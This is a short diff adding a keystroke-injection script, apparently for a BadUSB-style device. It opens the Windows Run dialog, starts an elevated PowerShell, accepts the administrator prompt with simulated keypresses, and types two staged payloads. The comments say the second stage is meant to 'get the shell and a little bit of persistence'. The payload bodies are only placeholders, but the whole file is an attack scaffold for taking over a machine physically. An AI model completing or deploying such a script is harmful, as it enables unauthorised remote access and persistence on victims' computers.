@@ -1,0 +1,12 @@
+Rem: open run panel
+Press:131+114
+Print:Powershell
+Press:+10
+Rem:open the admin powershell
+Print: "Apply stage1.ps1 in a one line style"
+Rem: click on the yes button
+Press:+9
+Delay:1000
+Press:+9
+Rem: get the shell and a little bit of persistence 
+Print:  "Apply stage2.ps1 in a one line style"
